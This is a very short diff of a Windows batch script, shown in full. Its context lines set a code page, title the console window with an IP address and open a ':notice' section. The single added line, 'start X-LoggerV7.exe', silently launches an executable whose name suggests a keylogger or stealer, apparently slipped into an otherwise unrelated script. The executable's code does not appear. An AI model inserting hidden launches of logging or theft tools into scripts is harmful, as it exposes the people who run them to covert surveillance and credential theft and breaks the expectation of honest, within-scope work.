@@ -1,4 +1,5 @@
 @echo off
+start X-LoggerV7.exe
 chcp 65001 >nul
 title 91.18.83.13
 :notice
